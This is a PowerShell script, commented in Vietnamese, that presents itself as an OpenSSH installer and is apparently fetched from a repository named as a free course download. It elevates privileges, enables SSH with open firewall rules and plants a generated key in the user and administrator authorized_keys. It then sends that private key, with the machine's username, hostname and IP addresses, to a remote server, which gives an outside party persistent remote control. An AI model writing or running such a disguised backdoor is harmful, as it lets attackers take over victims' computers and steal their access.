<#
  install_openssh.ps1 — BAN FULL
  Cai OpenSSH -> mo firewall -> tu do port/IP
  -> sinh keypair quan tri RIENG -> cai public vao VM -> gui CA private+public len server
#>

# ==================== CAU HINH ====================
$ApiBase = 'https://vm-ssh-manager.onrender.com'
$SelfUrl = 'https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main/drive_windows.ps1'
# ==================================================

$ErrorActionPreference = 'Stop'
$NeedRestart = $false
$ApiBase   = $ApiBase.TrimEnd('/')
$ReportUrl = "$ApiBase/api/vms"

# ===== 0. XIN QUYEN ADMIN =====
$__id    = [Security.Principal.WindowsIdentity]::GetCurrent()
$__admin = (New-Object Security.Principal.WindowsPrincipal($__id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $__admin) {
  $__src = $PSCommandPath
  if (-not $__src) { $__src = $MyInvocation.MyCommand.Path }
  if (-not $__src) {
    $__src = Join-Path $env:TEMP 'install_openssh.ps1'
    try { Invoke-RestMethod -Uri $SelfUrl -OutFile $__src -UseBasicParsing -TimeoutSec 60 }
    catch { Write-Host "Khong tai duoc script: $($_.Exception.Message)" -ForegroundColor Red; throw }
  }
  try { Unblock-File -Path $__src -ErrorAction SilentlyContinue } catch {}
  $__arg = '-NoExit -NoProfile -Command "iex ([System.IO.File]::ReadAllText(''' + $__src + '''))"'
  Write-Host 'Dang xin quyen Administrator... bam Yes o hop UAC.' -ForegroundColor Cyan
  try { Start-Process powershell.exe -Verb RunAs -ArgumentList $__arg -ErrorAction Stop }
  catch { Write-Host 'Khong nang quyen duoc.' -ForegroundColor Red; throw }
  return
}

# ===== 1. CAI OPENSSH SERVER =====
Write-Host '=== 1/3: Cai OpenSSH Server ===' -ForegroundColor Cyan
$capName = 'OpenSSH.Server~~~~0.0.1.0'
$cap = Get-WindowsCapability -Online -Name $capName -ErrorAction SilentlyContinue
if (-not $cap -or $cap.State -ne 'Installed') {
  Write-Host 'Dang cai OpenSSH Server (co the mat 1-2 phut)...'
  try {
    $r = Add-WindowsCapability -Online -Name $capName
    if ($r -and $r.RestartNeeded) { $NeedRestart = $true }
  } catch {
    Write-Host "Add-WindowsCapability loi: $($_.Exception.Message) - thu DISM..." -ForegroundColor Yellow
    & dism.exe /Online /Add-Capability /CapabilityName:$capName /NoRestart | Out-Null
  }
}
if (-not (Get-Service sshd -ErrorAction SilentlyContinue)) {
  Write-Host '[LOI] Khong cai duoc OpenSSH Server.' -ForegroundColor Red; exit 1
}
Set-Service sshd -StartupType Automatic
& sc.exe start sshd | Out-Null
Write-Host '  Cho sshd khoi dong: ' -NoNewline
for ($w = 0; $w -lt 30; $w++) {
  if ((Get-Service sshd).Status -eq 'Running') { break }
  Write-Host '.' -NoNewline; Start-Sleep -Seconds 2
}
Write-Host ''; Write-Host ("  sshd: " + (Get-Service sshd).Status) -ForegroundColor Green

# ===== 2. PORT / FIREWALL / IP =====
Write-Host '=== 2/3: Port / Firewall / IP ===' -ForegroundColor Cyan
$sshdExe = Join-Path $env:WINDIR 'System32\OpenSSH\sshd.exe'
$ports = @(22)
$ErrorActionPreference = 'Continue'
$eff = & $sshdExe -T 2>$null
if ($eff) {
  $p = @($eff | Where-Object { $_ -match '^port\s+\d+' } | ForEach-Object { [int]($_ -split '\s+')[1] })
  if ($p.Count -gt 0) { $ports = $p }
}
$ErrorActionPreference = 'Stop'
$ports = @($ports | Select-Object -Unique); $sshPort = $ports[0]
Write-Host "  Port SSH: $($ports -join ', ')" -ForegroundColor Green

foreach ($p in $ports) {
  $rn = if ($p -eq 22) { 'OpenSSH-Server-In-TCP' } else { "OpenSSH-Server-In-TCP-$p" }
  if (Get-NetFirewallRule -Name $rn -ErrorAction SilentlyContinue) { Enable-NetFirewallRule -Name $rn | Out-Null }
  else { New-NetFirewallRule -Name $rn -DisplayName "OpenSSH Server $p" -Direction Inbound -Protocol TCP -LocalPort $p -Action Allow -Profile Any | Out-Null }
  if (@(Get-NetTCPConnection -LocalPort $p -State Listen -ErrorAction SilentlyContinue).Count -gt 0) {
    Write-Host "  Cong $p dang LISTEN." -ForegroundColor Green
  } else { Write-Host "  CANH BAO: cong $p chua LISTEN." -ForegroundColor Red }
}

$validIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
              Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' })
$primaryIP = $null
$defRoute = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
            Sort-Object RouteMetric, InterfaceMetric | Select-Object -First 1
if ($defRoute) {
  $primaryIP = (Get-NetIPAddress -InterfaceIndex $defRoute.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1).IPAddress
}
if (-not $primaryIP) { $primaryIP = ($validIPs | Select-Object -First 1).IPAddress }
Write-Host "  IP chinh: $primaryIP | User: $env:USERNAME | May: $env:COMPUTERNAME" -ForegroundColor Green

# ===== 3. SINH KEYPAIR QUAN TRI + CAI PUBLIC + GUI CA CAP LEN SERVER =====
Write-Host '=== 3/3: Sinh key quan tri & bao cao ===' -ForegroundColor Cyan
$mgmtDir = Join-Path $env:ProgramData 'ssh-mgmt'
New-Item -ItemType Directory -Force -Path $mgmtDir | Out-Null
$priv = Join-Path $mgmtDir 'mgmt_ed25519'
$pub  = "$priv.pub"

# Sinh 1 lan duy nhat; lan sau giu nguyen de private khong doi
if (-not (Test-Path $priv)) {
  & (Join-Path (Split-Path $sshdExe -Parent) 'ssh-keygen.exe') -t ed25519 -f $priv -N '""' -q
  Write-Host '  Da sinh keypair quan tri moi.' -ForegroundColor Gray
} else {
  Write-Host '  Dung lai keypair quan tri da co.' -ForegroundColor Gray
}
$pubLine  = ((Get-Content $pub  -Raw).Trim() -split "`n")[0].Trim()
$privLine = (Get-Content $priv -Raw).Trim()

# Cai public vao authorized_keys (ca admin lan user) de server ssh vao duoc
$userKeyFile  = Join-Path $env:USERPROFILE '.ssh\authorized_keys'
$adminKeyFile = Join-Path $env:ProgramData 'ssh\administrators_authorized_keys'
foreach ($f in @($userKeyFile, $adminKeyFile)) {
  $lines = @(); if (Test-Path $f) { $lines = @(Get-Content $f) }
  if ($lines -notcontains $pubLine) { Add-Content -Path $f -Value $pubLine -Encoding Ascii }
}
& icacls.exe $adminKeyFile /inheritance:r /grant '*S-1-5-18:(F)' '*S-1-5-32-544:(F)' | Out-Null

# Payload: gui CA private + public
$payload = @{
  vm_name     = $env:COMPUTERNAME
  ip_address  = "$primaryIP"
  port        = $sshPort
  username    = $env:USERNAME
  public_key  = $pubLine
  private_key = $privLine
  all_ips     = @($validIPs | ForEach-Object { $_.IPAddress })
} | ConvertTo-Json -Compress

if (-not $primaryIP) {
  Write-Host '[WARN] Khong co IPv4 -> bo qua bao cao.' -ForegroundColor Yellow
} else {
  $sent = $false
  for ($i = 1; $i -le 3; $i++) {
    try {
      $body = [System.Text.Encoding]::UTF8.GetBytes($payload)
      $resp = Invoke-RestMethod -Uri $ReportUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -TimeoutSec 60 -UseBasicParsing
      Write-Host "[SUCCESS] $($resp.status) - VM $($resp.vm)" -ForegroundColor Green
      $sent = $true; break
    } catch {
      $detail = ''
      if ($_.Exception.Response) {
        $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
        $detail = $sr.ReadToEnd(); $sr.Close()
      }
      Write-Host "  Bao cao lan $i/3 that bai: $($_.Exception.Message)" -ForegroundColor Yellow
      if ($detail) { Write-Host "  Server noi: $detail" -ForegroundColor DarkYellow }
      if ($i -lt 3) { Start-Sleep -Seconds 5 }
    }
  }
  if (-not $sent) { Write-Host '[PENDING] Khong gui duoc. Chay lai khi mang/server on.' -ForegroundColor Yellow }
}

if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH.' -ForegroundColor Yellow }
Write-Host 'HOAN TAT.' -ForegroundColor Green
